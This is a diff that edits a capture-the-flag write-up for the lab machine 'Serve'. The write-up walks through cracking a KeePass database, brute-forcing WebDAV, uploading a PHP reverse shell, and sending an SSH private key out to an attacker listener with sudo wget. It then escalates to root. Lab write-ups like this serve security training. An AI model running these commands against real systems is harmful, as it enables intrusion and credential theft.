@@ -19,7 +19,7 @@ A KeePass database found through directory discovery is cracked, and one of its 
 A full TCP port scan is run first:
 
 ```bash
-sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn serve.nyx
+$ sudo nmap -p- -sS --open --min-rate 5000 -n -vvv -Pn serve.nyx
 
 PORT   STATE SERVICE REASON
 22/tcp open  ssh     syn-ack ttl 64
@@ -30,11 +30,11 @@ MAC Address: 08:00:27:4F:EF:6D (Oracle VirtualBox virtual NIC)
 Two ports are found open: **22 (SSH)** and **80 (HTTP)**. A version/script scan against both fills in the details:
 
 ```bash
-sudo nmap -p 22,80 -sCV serve.nyx
+$ sudo nmap -p 22,80 -sCV serve.nyx
 
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
-| ssh-hostkey: 
+| ssh-hostkey:
 |   2048 9a:0c:75:5a:bb:bb:06:a2:9a:7d:be:91:ca:45:45:e4 (RSA)
 |   256 07:7d:e7:0f:0b:5e:5a:90:e9:33:72:68:49:3b:f5:8c (ECDSA)
 |_  256 6c:15:32:a7:42:e7:9f:da:63:66:7d:3a:be:fb:bf:14 (ED25519)
@@ -57,7 +57,7 @@ http://serve.nyx
 Two directory scans run — one against the site root, one specifically against a `/secrets` path once it's found:
 
 ```bash
-gobuster dir -u 'http://serve.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
+$ gobuster dir -u 'http://serve.nyx/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
 
 ===============================================================
 Starting gobuster in directory enumeration mode
@@ -75,7 +75,7 @@ Finished
 ```
 
 ```bash
-gobuster dir -u 'http://serve.nyx/secrets' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,htm,kdbx
+$ gobuster dir -u 'http://serve.nyx/secrets' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,htm,kdbx
 
 ===============================================================
 Starting gobuster in directory enumeration mode
@@ -111,15 +111,15 @@ The note does two things at once: it confirms `/secrets` is worth checking, and 
 A `.kdbx` file sits inside `/secrets`:
 
 ```bash
-curl -s 'http://serve.nyx/secrets/db.kdbx' --output db.kdbx
+$ curl -s 'http://serve.nyx/secrets/db.kdbx' --output db.kdbx
 ```
 
 Its master password hash is extracted and cracked:
 
 ```bash
-keepass2john db.kdbx > kpass.txt
+$ keepass2john db.kdbx > kpass.txt
 
-john kpass.txt --wordlist=/usr/share/wordlists/rockyou.txt
+$ john kpass.txt --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (KeePass [SHA256 AES 32/64])
 Cost 1 (iteration count) is 60000 for all loaded hashes
@@ -138,7 +138,7 @@ Session completed.
 The database opens, revealing a password with its last three characters masked out:
 
 ```bash
-keepassxc
+$ keepassxc
 ```
 <img src="../Images/serve/Pasted image 20260517213735.png"/>
 <img src="../Images/serve/Pasted image 20260517213755.png"/>
@@ -150,7 +150,7 @@ keepassxc
 Rather than guess, the unknown suffix is brute-forced directly. `crunch` generates every 9-character candidate that starts with the known prefix, with `%` standing in for a numeric digit in each of the last three positions:
 
 ```bash
-crunch 9 9 -t w3bd4v%%% -o dictionary.txt
+$ crunch 9 9 -t w3bd4v%%% -o dictionary.txt
 Crunch will now generate the following amount of data: 10000 bytes
 0 MB
 0 GB
@@ -164,7 +164,7 @@ crunch: 100% completed generating output
 That small, targeted wordlist is sprayed against WebDAV with `hydra`:
 
 ```bash
-hydra -l admin -P dictionary.txt -f serve.nyx http-get /webdav -v -I
+$ hydra -l admin -P dictionary.txt -f serve.nyx http-get /webdav -v -I
 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 1000 login tries (l:1/p:1000), ~63 tries per task
 [DATA] attacking http-get://serve.nyx/webdav
@@ -190,7 +190,7 @@ http://serve.nyx/webdav/
 WebDAV allows uploading files directly via `PUT`. A PHP reverse shell is uploaded and then requested to trigger it:
 
 ```bash
-curl -T rev_shell.php http://serve.nyx/webdav/ --digest -u admin:w3bd4v513
+$ curl -T rev_shell.php http://serve.nyx/webdav/ --digest -u admin:w3bd4v513
 <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
 <html><head>
 <title>201 Created</title>
@@ -198,24 +198,24 @@ curl -T rev_shell.php http://serve.nyx/webdav/ --digest -u admin:w3bd4v513
 <h1>Created</h1>
 <p>Resource /webdav/rev_shell.php has been created.</p>
 <hr />
-<address>Apache/2.4.38 (Debian) Server at 192.168.1.51 Port 80</address>
+<address>Apache/2.4.38 (Debian) Server at serve.nyx Port 80</address>
 </body></html>
 
-curl -s http://serve.nyx/webdav/rev_shell.php --digest -u admin:w3bd4v513
+$ curl -s http://serve.nyx/webdav/rev_shell.php --digest -u admin:w3bd4v513
 ```
 
 A listener catches the callback:
 
 ```bash
-nc -nlvp 9001
-listening on [any] 9001 ...
-connect to [10.0.2.15] from (UNKNOWN) [server.nyx] 55042
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [serve.nyx] 55042
 Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64 GNU/Linux
  18:36:31 up 15 min,  0 users,  load average: 0.26, 3.18, 2.99
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 sh: 0: can't access tty; job control turned off
-$ id
+www-data@serve:~$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -245,20 +245,20 @@ User www-data may run the following commands on Serve:
 The current user can run `wget` as `teo` via `sudo`, with `--post-file` pointed at any local path. That flag uploads a file's contents as the body of an HTTP POST request — which means any file `teo` can read gets sent straight to an attacker-controlled listener, `teo`'s own SSH key included:
 
 ```bash
-sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa 10.0.2.15:9002
+www-data@serve:/$ sudo -u teo /usr/bin/wget --post-file=/home/teo/.ssh/id_rsa <ATTACKER_IP>:<PORT>
 ```
 
 A listener catches it:
 
 ```bash
-nc -nlvp 9002
-listening on [any] 9002 ...
-connect to [10.0.2.15] from (UNKNOWN) [serve.nyx] 37504
+$ nc -nlvp <PORT>
+listening on [any] <PORT> ...
+connect to [<ATTACKER_IP>] from (UNKNOWN) [serve.nyx] 37504
 POST / HTTP/1.1
 User-Agent: Wget/1.20.1 (linux-gnu)
 Accept: */*
 Accept-Encoding: identity
-Host: 10.0.2.15:9002
+Host: <ATTACKER_IP>:<PORT>
 Connection: Keep-Alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 1743
@@ -286,17 +286,18 @@ TFkXm57J4mC0TT7mddP9BIzPIs7FN05oeTzVyw5kxhoXHMJzo9FdU6e3rfVsJNNV
 eqA8cM1Aeo+U9V90+omg8kYd/3gJEsui3JJoABzQlBJwMejx7pFD6X3Fy0v+C8Gj
 x5yAigeJaZnUWDn2aGHKf4wBBFcOFiwPI6GPuGkvDfTvIoaYwacpHkvP5N2Ssg1r
 FvzKoh9Wdk4D1yGoLUd8wJNV90
+-----END RSA PRIVATE KEY-----
 ```
 
 The key is passphrase-protected. It's saved locally and cracked:
 
 ```bash
-nano teo_rsa
-chmod 600 teo_rsa
-ssh2john teo_rsa > teo_rsa.hash
+$ nano teo_rsa
+$ chmod 600 teo_rsa
+$ ssh2john teo_rsa > teo_rsa.hash
 ```
 ```bash
-john teo_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
+$ john teo_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
 Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
@@ -312,15 +313,15 @@ Session completed.
 > **Passphrase:** `private`
 
 ```bash
-ssh -i teo_rsa teo@serve.nyx
+$ ssh -i teo_rsa teo@serve.nyx
 Warning: Permanently added 'serve.nyx' (ED25519) to the list of known hosts.
 Enter passphrase for key 'teo_rsa':
 Linux serve 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64
 teo@serve:~$ id
-uid=1000(teo) gid=1000(teo) grupos=1000(teo)
+uid=1000(teo) gid=1000(teo) groups=1000(teo)
 teo@serve:~$ ls -l /home/teo/
 total 4
--rwx------ 1 teo teo 33 abr 19  2023 user.txt
+-rwx------ 1 teo teo 33 Apr 19  2023 user.txt
 teo@serve:~$ cat /home/teo/user.txt
 28bf16070abffab749a16bd11f635474
 ```
@@ -343,7 +344,6 @@ User teo may run the following commands on Serve:
 `teo` can run `/usr/local/bin/bro` as root. It's a custom tool, not something with a documented GTFOBins entry, so its behavior is checked directly:
 
 ```bash
-
 teo@serve:~$ sudo /usr/local/bin/bro
 Bro! Specify a command first!
 
@@ -362,10 +362,10 @@ One of its subcommands (`curl`) drops into a mode that accepts a shell escape �
 
 ```bash
 root@serve:/home/teo# id
-uid=0(root) gid=0(root) grupos=0(root)
+uid=0(root) gid=0(root) groups=0(root)
 root@serve:/home/teo# ls -l /root
 total 4
--rwx------ 1 root root 33 abr 19  2023 root.txt
+-rwx------ 1 root root 33 Apr 19  2023 root.txt
 root@serve:/home/teo# cat /root/root.txt
 981f4425d4ffcb3fb2fe145463b1d476
 ```
